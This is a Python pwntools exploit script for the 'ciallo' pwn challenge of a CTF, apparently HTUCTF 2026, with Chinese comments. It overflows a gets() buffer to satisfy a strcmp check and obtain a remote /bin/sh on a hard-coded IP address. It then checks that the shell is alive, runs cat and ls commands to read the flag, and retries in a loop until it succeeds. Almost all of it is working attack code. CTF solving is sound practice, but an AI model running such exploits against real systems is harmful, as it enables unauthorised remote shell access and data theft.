#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Ciallo～(∠・ω )⌒★ — HTUCTF 2026 pwn (ELF64 PIE, 带 canary 但打不到)

漏洞：
    fangnai()  char buf[0x60]; memset(buf,0,0x58); buf[0x40]="zako";
               gets(buf);                       <- 无长度限制
               if (!strcmp(buf + 0x40, "ciallo")) system("/bin/sh");
    buf       = rbp-0x60
    buf+0x40  = rbp-0x20    <- "ciallo" 放这儿就能过 strcmp
    canary    = rbp-0x8     <- 距离还剩 0x18，根本没碰到
    所以不用泄 canary / 不用泄 PIE / 不用 ROP，程序自己把 system 端上来了。

坑：远程容器里 shell 拿到后经常秒退（空闲不收 FIN，一发命令就 RST）。
    必须「发 payload -> 探活 -> 活着才算成功」，否则重连。成功率约 2/12。

用法：
    python exp_ciallo.py                 # 自动重试直到拿到活 shell 并抓 flag
    python exp_ciallo.py PORT=32853
    python exp_ciallo.py HOST=1.2.3.4 PORT=9999
    python exp_ciallo.py -i              # 拿到活 shell 后直接交互
"""
import os
import re
import sys

from pwn import *

try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

HERE = os.path.dirname(os.path.abspath(__file__))

context.log_level = args.LOG or 'info'
context.arch = 'amd64'
context.binary = elf = ELF(os.path.join(HERE, 'ciallo'), checksec=False)

HOST = args.HOST or '103.163.47.230'
# 赛时实例换过端口，两个都试
PORTS = [int(args.PORT)] if args.PORT else [35117, 32853]

PAYLOAD = b'A' * 0x40 + b'ciallo'
MARK = b'PWNPWNPWN_OK'
CMDS = [
    b'cat /flag 2>/dev/null; cat /flag* 2>/dev/null; cat flag 2>/dev/null',
    b'cat ciallo 2>/dev/null | head -c 200; echo',
    b'ls -la / ; ls -la .',
]


def attempt(port):
    """连一次，打进 payload，再用 echo 探活。活着的返回 (io, banner)。"""
    try:
        io = remote(HOST, port, timeout=6)
    except Exception as e:
        log.debug('connect %s:%s -> %s', HOST, port, e)
        return None, b''

    try:
        banner = io.recvuntil('？'.encode(), timeout=5)
    except EOFError:
        io.close()
        return None, b''

    io.sendline(PAYLOAD)

    try:
        head = io.recvrepeat(0.6)
    except EOFError:
        head = b''
    if '不错' not in head.decode('utf-8', 'replace'):
        io.close()
        return None, banner + head

    # 探活：shell 活着才会有回显
    try:
        io.sendline(b'echo %s' % MARK)
        alive = io.recvrepeat(1.0)
    except EOFError:
        alive = b''
    if MARK not in alive:
        io.close()
        return None, banner + head + alive

    return io, banner + head + alive


def grab(io):
    out = b''
    for c in CMDS:
        try:
            io.sendline(c)
            out += io.recvrepeat(0.8)
        except EOFError:
            break
    return out


def main():
    tries = int(args.RETRY or 40)
    for i in range(1, tries + 1):
        for port in PORTS:
            log.info('try #%d  %s:%d', i, HOST, port)
            io, banner = attempt(port)
            if not io:
                continue
            log.success('活 shell: %s:%d', HOST, port)
            if args.i:
                io.interactive()
                return 0

            out = banner + grab(io)
            text = out.decode('utf-8', 'replace')
            m = re.search(r'HTUCTF\{[^}]*\}', text)
            if m:
                log.success('FLAG = %s', m.group(0))
                dst = os.path.join(HERE, 'flag.txt')
                if os.path.exists(dst):
                    open(dst + '.old', 'wb').write(open(dst, 'rb').read())   # 老内容留档
                open(dst, 'wb').write(m.group(0).encode())
                io.close()
                return 0
            log.warning('这次 shell 没吐出 flag，换一条连接')
            io.close()
    log.failure('%d 次都没拿到稳定 shell（容器竞态），稍后重跑', tries)
    return 1


if __name__ == '__main__':
    sys.exit(main())
